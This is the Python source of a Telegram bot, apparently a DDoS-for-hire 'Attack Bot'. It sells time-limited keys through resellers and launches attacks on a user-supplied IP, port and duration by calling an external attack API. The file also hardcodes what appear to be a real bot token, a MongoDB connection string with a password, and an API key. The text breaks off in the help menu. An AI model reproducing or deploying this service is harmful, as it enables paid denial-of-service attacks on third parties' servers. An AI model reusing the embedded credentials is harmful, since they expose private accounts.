#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from telebot import util as telebot_util
import threading
import re
from datetime import datetime, timedelta
import time
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import json
import secrets
import string
import os
import psutil
import platform
import html
import traceback
import signal
import sys
from pymongo import MongoClient
from pymongo.errors import PyMongoError, ConnectionFailure, ServerSelectionTimeoutError

# ================= CONFIG =================
BOT_TOKEN = "7594950150:AAGvXFPzhS8-AeDfT9j91A3v8xlzWsYvqjs"
BOT_OWNER = 5231119862

MONGO_URI = "mongodb+srv://yadavprince773953_db_user:YkdSuofOmLegDJkK@cluster0.yv323pa.mongodb.net/"
DB_NAME = "attack_bot"

DEFAULT_API_URL = "https://mygodx.xyz/api/attack"
DEFAULT_API_KEY = "D858768B147F98782329289C1ADE88C0"

DEFAULT_MAX_ATTACK_TIME = 400
DEFAULT_COOLDOWN = 80
DEFAULT_MAX_CONCURRENT = 4
PORT_BLOCK_DURATION = 7200  # 2 hours
AUTO_RESET_INTERVAL = 600  # 10 minutes for auto-reset
MAX_RETRIES = 3
RETRY_DELAY = 5
# ==========================================

# Set up logging
import logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot_errors.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Enhanced MongoDB connection with retry logic
def connect_to_mongodb():
    for attempt in range(MAX_RETRIES):
        try:
            client = MongoClient(
                MONGO_URI,
                serverSelectionTimeoutMS=5000,
                connectTimeoutMS=5000,
                socketTimeoutMS=5000,
                maxPoolSize=50,
                retryWrites=True
            )
            client.server_info()
            logger.info("Successfully connected to MongoDB")
            return client
        except (ConnectionFailure, ServerSelectionTimeoutError) as e:
            logger.error(f"MongoDB connection attempt {attempt + 1} failed: {e}")
            if attempt < MAX_RETRIES - 1:
                logger.info(f"Retrying in {RETRY_DELAY} seconds...")
                time.sleep(RETRY_DELAY)
            else:
                logger.critical("Failed to connect to MongoDB after multiple attempts")
                raise

try:
    client = connect_to_mongodb()
    db = client[DB_NAME]
except Exception as e:
    logger.critical(f"Could not initialize MongoDB: {e}")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML', threaded=True)

def get_collection(name):
    try:
        return db[name]
    except Exception as e:
        logger.error(f"Error accessing collection {name}: {e}")
        raise

groups_col = get_collection("approved_groups")
limits_col = get_collection("group_limits")
bans_col = get_collection("banned_users")
resellers_col = get_collection("resellers")
keys_col = get_collection("keys")
plans_col = get_collection("user_plans")
attack_logs_col = get_collection("attack_logs")
key_logs_col = get_collection("key_logs")
blocked_codes_col = get_collection("blocked_codes")
settings_col = get_collection("settings")
known_users_col = get_collection("known_users")
user_attack_history_col = get_collection("user_attack_history")
all_groups_col = get_collection("all_groups")
admins_col = get_collection("admins")
admin_logs_col = get_collection("admin_logs")
pending_feedback_col = get_collection("pending_feedback")
bot_stats_col = get_collection("bot_stats")
error_logs_col = get_collection("error_logs")
maintenance_logs_col = get_collection("maintenance_logs")
feedback_submissions_col = get_collection("feedback_submissions")

def initialize_settings():
    try:
        if settings_col.count_documents({}) == 0:
            settings_col.insert_one({
                "max_attack_time": DEFAULT_MAX_ATTACK_TIME,
                "cooldown": DEFAULT_COOLDOWN,
                "max_concurrent_attacks": DEFAULT_MAX_CONCURRENT,
                "port_protection": False,
                "feedback_system": True,
                "feedback_require_image": True,
                "maintenance_mode": False,
                "maintenance_start_time": None,
                "api_url": DEFAULT_API_URL,
                "api_key": DEFAULT_API_KEY,
                "auto_reset_enabled": True,
                "auto_reset_interval": AUTO_RESET_INTERVAL,
                "last_reset_time": datetime.now().isoformat(),
                "bot_version": "2.0.0",
                "bot_start_time": datetime.now().isoformat(),
                "total_attacks_handled": 0,
                "total_users_served": 0
            })
            logger.info("Settings initialized with default values")
    except Exception as e:
        logger.error(f"Error initializing settings: {e}")
        raise

initialize_settings()

def get_setting(key, default=None):
    try:
        doc = settings_col.find_one()
        return doc.get(key, default) if doc else default
    except Exception as e:
        logger.error(f"Error getting setting {key}: {e}")
        return default

def update_setting(key, value):
    try:
        settings_col.update_one({}, {"$set": {key: value}}, upsert=True)
        return True
    except Exception as e:
        logger.error(f"Error updating setting {key}: {e}")
        return False

# ================= Enhanced Error Handler =================
def log_error(error, user_id=None, command=None, extra_info=None):
    try:
        error_data = {
            "timestamp": datetime.now().isoformat(),
            "error_type": type(error).__name__,
            "error_message": str(error),
            "traceback": traceback.format_exc(),
            "user_id": str(user_id) if user_id else None,
            "command": command,
            "extra_info": extra_info or {}
        }
        error_logs_col.insert_one(error_data)
        logger.error(f"Error logged: {error_data['error_type']}: {error_data['error_message']}")
    except Exception as e:
        logger.error(f"Failed to log error: {e}")

def safe_execute(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except PyMongoError as e:
            logger.error(f"MongoDB error in {func.__name__}: {e}")
            try:
                global client, db
                client = connect_to_mongodb()
                db = client[DB_NAME]
                logger.info("MongoDB reconnection successful")
            except:
                logger.error("MongoDB reconnection failed")
            return None
        except requests.exceptions.RequestException as e:
            logger.error(f"Network error in {func.__name__}: {e}")
            return None
        except Exception as e:
            logger.error(f"Unexpected error in {func.__name__}: {e}")
            log_error(e, extra_info={"function": func.__name__})
            return None
    return wrapper

# ================= Helper Functions =================
@safe_execute
def is_owner(user_id):
    return user_id == BOT_OWNER

@safe_execute
def is_admin(user_id):
    try:
        return admins_col.count_documents({"_id": str(user_id)}) > 0
    except:
        return False

def is_admin_or_owner(user_id):
    return is_owner(user_id) or is_admin(user_id)

@safe_execute
def log_admin_action(admin_id, action, details=None):
    try:
        admin_logs_col.insert_one({
            "timestamp": datetime.now().isoformat(),
            "admin_id": admin_id,
            "action": action,
            "details": details or ""
        })
    except Exception as e:
        logger.error(f"Failed to log admin action: {e}")

@safe_execute
def is_reseller(user_id):
    try:
        return resellers_col.count_documents({"_id": str(user_id)}) > 0
    except:
        return False

@safe_execute
def is_approved_group(chat_id):
    try:
        return groups_col.count_documents({"_id": str(chat_id)}) > 0
    except:
        return False

@safe_execute
def get_group_limits(chat_id):
    try:
        doc = limits_col.find_one({"_id": str(chat_id)})
        if doc:
            return (
                doc.get("max_concurrent", 1), 
                doc.get("max_time", get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME)), 
                doc.get("cooldown", get_setting("cooldown", DEFAULT_COOLDOWN))
            )
        return 1, get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME), get_setting("cooldown", DEFAULT_COOLDOWN)
    except:
        return 1, DEFAULT_MAX_ATTACK_TIME, DEFAULT_COOLDOWN

@safe_execute
def set_group_limits(chat_id, max_concurrent, max_time, cooldown):
    try:
        limits_col.update_one(
            {"_id": str(chat_id)},
            {"$set": {
                "max_concurrent": max_concurrent,
                "max_time": max_time,
                "cooldown": cooldown
            }},
            upsert=True
        )
        return True
    except Exception as e:
        logger.error(f"Error setting group limits: {e}")
        return False

@safe_execute
def is_banned(user_id):
    try:
        return bans_col.count_documents({"_id": str(user_id)}) > 0
    except:
        return False

def is_group(message):
    return message.chat.type in ['group', 'supergroup']

@safe_execute
def record_known_user(user_id):
    try:
        known_users_col.update_one(
            {"_id": str(user_id)}, 
            {"$set": {
                "_id": str(user_id),
                "last_seen": datetime.now().isoformat()
            }}, 
            upsert=True
        )
    except:
        pass

@safe_execute
def record_all_group(chat_id, title=""):
    try:
        all_groups_col.update_one(
            {"_id": str(chat_id)}, 
            {"$set": {
                "title": title,
                "last_active": datetime.now().isoformat()
            }}, 
            upsert=True
        )
    except:
        pass

# ================= Feedback System Functions =================
@safe_execute
def has_pending_feedback(user_id):
    try:
        return pending_feedback_col.count_documents({"_id": str(user_id)}) > 0
    except:
        return False

@safe_execute
def mark_feedback_pending(user_id, attack_data=None):
    try:
        pending_feedback_col.update_one(
            {"_id": str(user_id)},
            {"$set": {
                "last_attack": datetime.now().isoformat(),
                "attack_data": attack_data or {},
                "pending_since": datetime.now().isoformat()
            }},
            upsert=True
        )
        return True
    except Exception as e:
        logger.error(f"Error marking feedback pending: {e}")
        return False

@safe_execute
def clear_pending_feedback(user_id):
    try:
        pending_feedback_col.delete_one({"_id": str(user_id)})
        return True
    except Exception as e:
        logger.error(f"Error clearing pending feedback: {e}")
        return False

@safe_execute
def save_feedback_submission(user_id, file_id, file_type, caption=None, attack_data=None):
    try:
        feedback_submissions_col.insert_one({
            "user_id": str(user_id),
            "file_id": file_id,
            "file_type": file_type,
            "caption": caption or "",
            "attack_data": attack_data or {},
            "submitted_at": datetime.now().isoformat(),
            "reviewed": False,
            "reviewed_by": None,
            "reviewed_at": None
        })
        return True
    except Exception as e:
        logger.error(f"Error saving feedback submission: {e}")
        return False

@safe_execute
def get_pending_feedback_count():
    try:
        return pending_feedback_col.count_documents({})
    except:
        return 0

@safe_execute
def get_feedback_submissions(limit=50, reviewed=False):
    try:
        query = {"reviewed": reviewed}
        return list(feedback_submissions_col.find(query).sort("submitted_at", -1).limit(limit))
    except Exception as e:
        logger.error(f"Error getting feedback submissions: {e}")
        return []

@safe_execute
def mark_feedback_reviewed(submission_id, admin_id):
    try:
        feedback_submissions_col.update_one(
            {"_id": submission_id},
            {"$set": {
                "reviewed": True,
                "reviewed_by": str(admin_id),
                "reviewed_at": datetime.now().isoformat()
            }}
        )
        return True
    except Exception as e:
        logger.error(f"Error marking feedback reviewed: {e}")
        return False

@safe_execute
def has_valid_plan(user_id, send_expiry_msg=True):
    try:
        plan = plans_col.find_one({"_id": str(user_id)})
        if not plan:
            return False
        
        expires = plan.get("expires")
        if expires:
            expires_dt = datetime.fromisoformat(expires)
            if datetime.now() > expires_dt:
                plans_col.delete_one({"_id": str(user_id)})
                code = plan.get("redeemed_code")
                reseller_info = ""
                if code:
                    key = keys_col.find_one({"_id": code})
                    if key:
                        created_by = key.get("created_by")
                        if created_by and is_reseller(created_by):
                            try:
                                reseller_chat = bot.get_chat(int(created_by))
                                if reseller_chat.username:
                                    reseller_info = f"\n\n💡 Contact @{reseller_chat.username} to renew your access."
                                else:
                                    reseller_info = f"\n\n💡 Contact reseller ({created_by}) to renew your access."
                            except:
                                reseller_info = f"\n\n💡 Contact reseller ({created_by}) to renew your access."
                
                if send_expiry_msg:
                    try:
                        bot.send_message(
                            user_id, 
                            f"❌ <b>Your Access Has Expired</b>\n\n"
                            f"📅 Plan expired on: {expires_dt.strftime('%Y-%m-%d %H:%M:%S')}\n"
                            f"{reseller_info}\n\n"
                            f"Use /redeem with a new code to continue using the bot."
                        )
                    except:
                        pass
                return False
        
        return True
        
    except Exception as e:
        logger.error(f"Error checking plan for user {user_id}: {e}")
        return False

def is_authorized(user_id, chat_id=None):
    if is_owner(user_id) or is_admin(user_id):
        return True
    if is_reseller(user_id):
        return True
    if has_valid_plan(user_id, send_expiry_msg=False):
        return True
    if chat_id and is_approved_group(chat_id) and not is_banned(user_id):
        return True
    return False

def get_user_limits(user_id):
    if is_owner(user_id) or is_admin(user_id):
        return 999999, 999999, 0
    
    plan = plans_col.find_one({"_id": str(user_id)})
    if plan and has_valid_plan(user_id, send_expiry_msg=False):
        return (1,
                plan.get("max_duration", get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME)),
                plan.get("cooldown", get_setting("cooldown", DEFAULT_COOLDOWN)))
    
    return 1, get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME), get_setting("cooldown", DEFAULT_COOLDOWN)

def check_access(message):
    user_id = message.from_user.id
    
    if get_setting("maintenance_mode", False) and not is_owner(user_id):
        bot.reply_to(message, "🛠️ <b>Bot Under Maintenance</b>\n\n"
                     "The bot is currently being upgraded. Please check back later.\n"
                     "Only the bot owner can use it during maintenance.")
        return False
    
    if is_owner(user_id):
        return True
    
    if is_admin(user_id):
        return True
    
    if is_group(message):
        record_all_group(message.chat.id, message.chat.title or "")
        
        if not is_approved_group(message.chat.id):
            bot.reply_to(message, "🚫 <b>Group Not Approved</b>\n\n"
                         f"Group ID: <code>{message.chat.id}</code>\n"
                         "Contact the bot owner to get this group approved.")
            return False
        
        if is_banned(user_id):
            bot.reply_to(message, "🚫 <b>You Are Banned</b>\n\n"
                         "You have been banned from using this bot.\n"
                         "Contact the bot owner to appeal.")
            return False
        
        return True
    
    if not is_group(message):
        record_known_user(user_id)
        
        if is_reseller(user_id):
            return True
        
        if has_valid_plan(user_id):
            if is_banned(user_id):
                bot.reply_to(message, "🚫 <b>You Are Banned</b>\n\n"
                             "You have been banned from using this bot.\n"
                             "Contact the bot owner to appeal.")
                return False
            return True
        
        bot.reply_to(message, 
                    "👋 <b>Welcome to Attack Bot!</b>\n\n"
                    "╔════════════════════════╗\n"
                    "║   🔐 AUTH REQUIRED    ║\n"
                    "╚════════════════════════╝\n\n"
                    "📋 <b>How to Get Access:</b>\n"
                    "1️⃣ Buy a key from our resellers\n"
                    "2️⃣ Use /redeem to activate your key\n"
                    "3️⃣ Join an authorized group\n\n"
                    "💡 <b>Commands:</b>\n"
                    "• /start - Start the bot\n"
                    "• /help - Show help menu\n"
                    "• /redeem - Redeem your key\n"
                    "• /getid - Get your user ID\n\n"
                    "⚡ <b>All authorized users get unlimited attacks!</b>")
        return False
    
    return False

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False

def validate_port(port):
    try:
        port = int(port)
        return 1 <= port <= 65535
    except:
        return False

def validate_duration(duration, max_allowed=None):
    try:
        duration = int(duration)
        if duration <= 0:
            return False
        if max_allowed and duration > max_allowed:
            return False
        if duration > 600:
            return False
        return True
    except:
        return False

# ================= Attack Concurrency Management =================
active_attacks = {}
user_cooldowns = {}
_attack_lock = threading.RLock()
live_status_trackers = {}
attack_queue = []
queue_lock = threading.Lock()

def get_user_cooldown(user_id):
    if is_owner(user_id) or is_admin(user_id):
        return 0
    
    with _attack_lock:
        if str(user_id) not in user_cooldowns:
            return 0
        cooldown_end = user_cooldowns[str(user_id)]
        remaining = (cooldown_end - datetime.now()).total_seconds()
        if remaining <= 0:
            del user_cooldowns[str(user_id)]
            return 0
        return int(remaining)

def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id:
                return True
        return False

def get_active_attack_count():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            del active_attacks[k]
        return len(active_attacks)

def get_group_active_attacks_count(chat_id):
    with _attack_lock:
        now = datetime.now()
        count = 0
        for attack in active_attacks.values():
            if attack['end_time'] <= now:
                continue
            if attack.get('chat_id') == chat_id and attack.get('chat_type') in ['group', 'supergroup']:
                count += 1
        return count

def get_user_active_attacks_in_group(user_id, chat_id):
    with _attack_lock:
        now = datetime.now()
        count = 0
        for attack in active_attacks.values():
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id and attack.get('chat_id') == chat_id:
                count += 1
        return count

def is_port_blocked(target, port):
    key = f"{target}:{port}"
    try:
        blocked = settings_col.find_one({"_id": "blocked_ports"}) or {}
        if key in blocked:
            block_time = datetime.strptime(blocked[key], '%d-%m-%Y %H:%M:%S')
            if (datetime.now() - block_time).total_seconds() < PORT_BLOCK_DURATION:
                remaining = PORT_BLOCK_DURATION - (datetime.now() - block_time).total_seconds()
                return True, int(remaining)
            else:
                settings_col.update_one(
                    {"_id": "blocked_ports"}, 
                    {"$unset": {key: ""}}
                )
    except:
        pass
    return False, 0

def check_port_protection(user_id, target, port):
    if not get_setting("port_protection", False) or is_owner(user_id) or is_admin(user_id):
        return False, 0
    
    key = f"{target}:{port}"
    try:
        history = user_attack_history_col.find_one({"_id": str(user_id)})
        if history and key in history.get("targets", {}):
            last_attack = datetime.fromisoformat(history["targets"][key])
            elapsed = (datetime.now() - last_attack).total_seconds()
            if elapsed < PORT_BLOCK_DURATION:
                remaining = PORT_BLOCK_DURATION - elapsed
                return True, int(remaining)
    except:
        pass
    return False, 0

def execute_attack(target, port, duration):
    url = get_setting("api_url", DEFAULT_API_URL)
    api_key = get_setting("api_key", DEFAULT_API_KEY)
    
    full_url = f"{url}?target={target}&port={port}&time={duration}&api_key={api_key}"
    
    session = requests.Session()
    retries = Retry(
        total=2, 
        backoff_factor=0.5, 
        status_forcelist=[500, 502, 503, 504],
        raise_on_status=False
    )
    session.mount('https://', HTTPAdapter(max_retries=retries))
    
    try:
        resp = session.get(full_url, timeout=15)
        if resp.status_code == 200:
            return resp
    except Exception as e:
        logger.error(f"API request failed: {e}")
    
    class DummyResponse:
        def __init__(self):
            self.status_code = 500
            self.text = '{"message": "API server rejected the request", "success": false}'
    return DummyResponse()

def start_attack(target, port, duration, message, attack_id, cooldown_seconds):
    try:
        user_id = message.from_user.id
        chat_type = message.chat.type
        
        start_msg = (
            f"🚀 <b>Attack Launched!</b>\n"
            f"╔════════════════════════╗\n"
            f"║   ⚔️ ATTACK ACTIVE    ║\n"
            f"╚════════════════════════╝\n\n"
            f"🎯 <b>Target:</b> {target}\n"
            f"🔌 <b>Port:</b> {port}\n"
            f"⏱ <b>Duration:</b> {duration}s\n"
            f"📡 <b>Method:</b> game\n"
            f"📍 <b>Location:</b> {'Private' if chat_type == 'private' else 'Group'}\n"
            f"⏳ <b>Cooldown:</b> {cooldown_seconds}s after attack\n\n"
            f"🔄 Attack is running..."
        )
        bot.reply_to(message, start_msg)
        
        attack_logs_col.insert_one({
            "timestamp": datetime.now().isoformat(),
            "user_id": user_id,
            "target": target,
            "port": port,
            "duration": duration,
            "status": "started",
            "chat_type": chat_type,
            "attack_id": attack_id
        })
        
        bot_stats_col.update_one(
            {"_id": "stats"},
            {"$inc": {"total_attacks_handled": 1}},
            upsert=True
        )
        
        response = execute_attack(target, port, duration)
        api_success = response.status_code == 200
        
        if api_success:
            if not is_owner(user_id) and not is_admin(user_id):
                with _attack_lock:
                    user_cooldowns[str(user_id)] = datetime.now() + timedelta(seconds=duration + cooldown_seconds)
            
            time.sleep(duration)
            
            with _attack_lock:
                if attack_id in active_attacks:
                    del active_attacks[attack_id]
            
            complete_msg = (
                f"✅ <b>Attack Completed!</b>\n"
                f"╔════════════════════════╗\n"
                f"║   ✨ SUCCESS           ║\n"
                f"╚════════════════════════╝\n\n"
                f"🎯 <b>Target:</b> {target}:{port}\n"
                f"⏱️ <b>Duration:</b> {duration}s\n"
                f"⏳ <b>Cooldown:</b> {cooldown_seconds}s\n\n"
                f"📸 <b>Feedback Required:</b>\n"
                f"Please send a screenshot/image of the attack result.\n"
                f"Send any image to continue using the bot.\n\n"
                f"🔄 Ready for next attack after you submit feedback!"
            )
            bot.reply_to(message, complete_msg)
            
            attack_logs_col.insert_one({
                "timestamp": datetime.now().isoformat(),
                "user_id": user_id,
                "target": target,
                "port": port,
                "duration": duration,
                "status": "completed",
                "chat_type": chat_type,
                "attack_id": attack_id
            })
            
            if get_setting("port_protection", False):
                key = f"{target}:{port}"
                user_attack_history_col.update_one(
                    {"_id": str(user_id)},
                    {"$set": {f"targets.{key}": datetime.now().isoformat()}},
                    upsert=True
                )
            
            if not is_owner(user_id) and not is_admin(user_id) and get_setting("feedback_system", True):
                attack_data = {
                    "target": target,
                    "port": port,
                    "duration": duration,
                    "attack_id": attack_id,
                    "completed_at": datetime.now().isoformat()
                }
                mark_feedback_pending(user_id, attack_data)
                
        else:
            with _attack_lock:
                if attack_id in active_attacks:
                    del active_attacks[attack_id]
            
            attack_logs_col.insert_one({
                "timestamp": datetime.now().isoformat(),
                "user_id": user_id,
                "target": target,
                "port": port,
                "duration": duration,
                "status": "failed",
                "chat_type": chat_type,
                "attack_id": attack_id,
                "error": response.text if hasattr(response, 'text') else "Unknown error"
            })
            
            fail_msg = (
                f"❌ <b>Attack Failed</b>\n\n"
                f"🎯 Target: {target}:{port}\n"
                f"⚠️ The attack server rejected the request.\n"
                f"Please try again later or with different parameters."
            )
            bot.reply_to(message, fail_msg)
        
    except Exception as e:
        logger.error(f"Attack execution error: {e}")
        log_error(e, user_id=user_id, extra_info={
            "target": target,
            "port": port,
            "duration": duration,
            "attack_id": attack_id
        })
        
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
        
        try:
            bot.reply_to(message, f"❌ <b>Attack Error</b>\n\nAn unexpected error occurred. The attack has been cancelled.")
        except:
            pass

# ================= Key Management Functions =================
def log_key_event(event_type, code, created_by=None, redeemed_by=None, extra=""):
    try:
        key_logs_col.insert_one({
            "timestamp": datetime.now().isoformat(),
            "event": event_type,
            "code": code,
            "created_by": created_by,
            "redeemed_by": redeemed_by,
            "extra": extra
        })
    except Exception as e:
        logger.error(f"Failed to log key event: {e}")

def generate_code(prefix="", length=12):
    chars = string.ascii_uppercase + string.digits
    random_part = ''.join(secrets.choice(chars) for _ in range(length))
    if prefix:
        return f"{prefix.upper()}-{random_part}"
    return random_part

def format_expiry(expiry_dt):
    return expiry_dt.strftime("%A, %B %d, %Y at %H:%M:%S")

def format_duration(seconds):
    if seconds < 60:
        return f"{seconds}s"
    elif seconds < 3600:
        minutes = seconds // 60
        secs = seconds % 60
        return f"{minutes}m {secs}s"
    else:
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60
        return f"{hours}h {minutes}m"

def parse_duration_input(duration_str):
    duration_str = duration_str.lower().strip()
    
    if duration_str.endswith('hr') or duration_str.endswith('h'):
        try:
            hours = int(duration_str.replace('hr', '').replace('h', '').strip())
            if hours in [1, 6, 12]:
                return hours, 'hours'
        except:
            pass
    
    if duration_str.endswith('d') or duration_str.endswith('day'):
        try:
            days = int(duration_str.replace('d', '').replace('day', '').strip())
            if days in [1, 2, 3, 4, 5, 6, 7, 30]:
                return days, 'days'
        except:
            pass
    
    return None, None

def get_price(hours=None, days=None):
    pricing = {
        'hours': {
            1: 4,
            6: 25,
            12: 50
        },
        'days': {
            1: 100,
            2: 200,
            3: 300,
            4: 400,
            5: 500,
            6: 600,
            7: 700,
            30: 3000
        }
    }
    
    if hours is not None and hours in pricing['hours']:
        return pricing['hours'][hours]
    if days is not None and days in pricing['days']:
        return pricing['days'][days]
    return None

# ================= BOT COMMANDS =================

# START COMMAND
@bot.message_handler(commands=['start'])
def start_command(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        if get_setting("maintenance_mode", False) and not is_owner(user_id):
            bot.reply_to(message, "🛠️ <b>Bot Under Maintenance</b>\n\n"
                         "The bot is currently being upgraded for better performance.\n"
                         "Please try again later.")
            return
        
        if not is_group(message):
            record_known_user(user_id)
        else:
            record_all_group(chat_id, message.chat.title or "")
        
        if is_owner(user_id):
            welcome_msg = (
                f"👑 <b>Welcome Back, Owner!</b>\n"
                f"╔════════════════════════╗\n"
                f"║   👑 OWNER ACCESS     ║\n"
                f"╚════════════════════════╝\n\n"
                f"📊 <b>Bot Status:</b>\n"
                f"• Active Attacks: {get_active_attack_count()}/{get_setting('max_concurrent_attacks', DEFAULT_MAX_CONCURRENT)}\n"
                f"• Approved Groups: {groups_col.count_documents({})}\n"
                f"• Active Users: {plans_col.count_documents({'expires': {'$gt': datetime.now().isoformat()}})}\n"
                f"• Resellers: {resellers_col.count_documents({})}\n"
                f"• Pending Feedback: {get_pending_feedback_count()}\n\n"
                f"💡 <b>Quick Commands:</b>\n"
                f"• /owner - Owner Panel\n"
                f"• /state - Bot Statistics\n"
                f"• /help - All Commands\n\n"
                f"⚡ <b>Unlimited access to all features!</b>"
            )
        elif is_admin(user_id):
            welcome_msg = (
                f"👮 <b>Welcome Back, Admin!</b>\n"
                f"╔════════════════════════╗\n"
                f"║   👮 ADMIN ACCESS     ║\n"
                f"╚════════════════════════╝\n\n"
                f"📊 <b>Quick Stats:</b>\n"
                f"• Active Attacks: {get_active_attack_count()}/{get_setting('max_concurrent_attacks', DEFAULT_MAX_CONCURRENT)}\n"
                f"• Approved Groups: {groups_col.count_documents({})}\n"
                f"• Pending Feedback: {get_pending_feedback_count()}\n\n"
                f"💡 <b>Quick Commands:</b>\n"
                f"• /owner - Admin Panel\n"
                f"• /state - Bot Statistics\n"
                f"• /help - All Commands\n\n"
                f"⚡ <b>Unlimited access to admin features!</b>"
            )
        elif is_reseller(user_id):
            reseller = resellers_col.find_one({"_id": str(user_id)})
            credits = reseller.get("credits", 0) if reseller else 0
            welcome_msg = (
                f"💰 <b>Welcome Back, Reseller!</b>\n"
                f"╔════════════════════════╗\n"
                f"║   💰 RESELLER ACCESS  ║\n"
                f"╚════════════════════════╝\n\n"
                f"📊 <b>Your Stats:</b>\n"
                f"• Credits: {credits}\n"
                f"• Active Keys: {keys_col.count_documents({'created_by': user_id, 'redeemed_by': None, 'expires': {'$gt': datetime.now().isoformat()}})}\n\n"
                f"💡 <b>Quick Commands:</b>\n"
                f"• /reseller_panel - Your Panel\n"
                f"• /gen - Generate Keys\n"
                f"• /mycredits - Check Credits\n"
                f"• /help - All Commands\n\n"
                f"⚡ <b>Unlimited attacks and key generation!</b>"
            )
        elif has_valid_plan(user_id, send_expiry_msg=False):
            plan = plans_col.find_one({"_id": str(user_id)})
            expires = datetime.fromisoformat(plan["expires"])
            remaining = expires - datetime.now()
            
            welcome_msg = (
                f"✅ <b>Welcome Back, Authorized User!</b>\n"
                f"╔════════════════════════╗\n"
                f"║   ✅ ACTIVE PLAN      ║\n"
                f"╚════════════════════════╝\n\n"
                f"📅 <b>Plan Expires:</b> {format_expiry(expires)}\n"
                f"⏰ <b>Time Remaining:</b> {remaining.days}d {remaining.seconds//3600}h\n"
                f"🎯 <b>Attacks:</b> Unlimited\n"
                f"⏱️ <b>Max Duration:</b> {plan['max_duration']}s\n"
                f"⏳ <b>Cooldown:</b> {plan['cooldown']}s\n\n"
                f"💡 <b>Quick Commands:</b>\n"
                f"• /attack - Launch Attack\n"
                f"• /status - Check Status\n"
                f"• /check_my_access - View Plan\n"
                f"• /help - All Commands\n\n"
                f"📸 <b>Feedback Required:</b>\n"
                f"After each attack, send a screenshot/image to continue!"
            )
        elif is_group(message) and is_approved_group(chat_id):
            limits = get_group_limits(chat_id)
            welcome_msg = (
                f"👥 <b>Welcome to {message.chat.title or 'Group'}!</b>\n"
                f"╔════════════════════════╗\n"
                f"║   👥 GROUP ACCESS     ║\n"
                f"╚════════════════════════╝\n\n"
                f"📊 <b>Group Limits:</b>\n"
                f"• Max Concurrent: {limits[0]}\n"
                f"• Max Time: {limits[1]}s\n"
                f"• Cooldown: {limits[2]}s\n\n"
                f"💡 <b>Available Commands:</b>\n"
                f"• /attack - Launch Attack\n"
                f"• /status - Check Status\n"
                f"• /help - All Commands\n\n"
                f"⚡ <b>Use the bot directly in this group!</b>"
            )
        else:
            welcome_msg = (
                f"👋 <b>Welcome to Attack Bot!</b>\n"
                f"╔════════════════════════╗\n"
                f"║   🔐 AUTH REQUIRED    ║\n"
                f"╚════════════════════════╝\n\n"
                f"📋 <b>How to Get Access:</b>\n"
                f"1️⃣ Purchase a key from our resellers\n"
                f"2️⃣ Use /redeem YOUR-KEY\n"
                f"3️⃣ Or join an authorized group\n\n"
                f"💡 <b>Commands:</b>\n"
                f"• /start - Start bot\n"
                f"• /help - Help menu\n"
                f"• /redeem - Redeem key\n"
                f"• /getid - Get your ID\n\n"
                f"⚡ <b>All authorized users get unlimited attacks!</b>"
            )
        
        bot.reply_to(message, welcome_msg)
        
    except Exception as e:
        logger.error(f"Error in start command: {e}")
        log_error(e, user_id=message.from_user.id, command="start")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# HELP COMMAND
@bot.message_handler(commands=['help'])
def help_command(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        if is_owner(user_id):
            help_text = (
                f"👑 <b>OWNER COMMANDS</b> 👑\n"
                f"╔══════════════════════════════╗\n"
                f"║   👑 FULL SYSTEM CONTROL    ║\n"
                f"╚══════════════════════════════╝\n\n"
                f"━━━━━━━ <b>ADMIN MANAGEMENT</b> ━━━━━━━\n"
                f"• /addadmin &lt;id&gt; - Add admin\n"
                f"• /removeadmin &lt;id&gt; - Remove admin\n"
                f"• /admins - List all admins\n"
                f"• /adminlogs [N] - View admin logs\n\n"
                f"━━━━━━━ <b>GROUP MANAGEMENT</b> ━━━━━━━\n"
                f"• /approve &lt;id&gt; &lt;conc&gt; &lt;time&gt; &lt;cd&gt; - Approve group\n"
                f"• /disapprove &lt;id&gt; - Remove group\n"
                f"• /approved_groups - List groups\n\n"
                f"━━━━━━━ <b>USER MANAGEMENT</b> ━━━━━━━\n"
                f"• /ban &lt;id&gt; - Ban user\n"
                f"• /unban &lt;id&gt; - Unban user\n"
                f"• /banned_list - List banned users\n"
                f"• /users - List active users\n"
                f"• /remove &lt;id&gt; - Remove user plan\n"
                f"• /remove_expired - Clean expired plans\n"
                f"• /reset_user &lt;id&gt; - Reset user\n"
                f"• /get_user_info &lt;id&gt; - User details\n"
                f"• /set_user_limit &lt;id&gt; &lt;time&gt; &lt;cd&gt; - Set limits\n\n"
                f"━━━━━━━ <b>RESELLER SYSTEM</b> ━━━━━━━\n"
                f"• /add_reseller &lt;id&gt; - Add reseller\n"
                f"• /remove_reseller &lt;id&gt; - Remove reseller\n"
                f"• /resellers - List resellers\n"
                f"• /addcredit &lt;id&gt; &lt;amount&gt; - Add credits\n"
                f"• /removecredit &lt;id&gt; &lt;amount&gt; - Remove credits\n"
                f"• /reseller_info &lt;id&gt; - Reseller details\n\n"
                f"━━━━━━━ <b>KEY MANAGEMENT</b> ━━━━━━━\n"
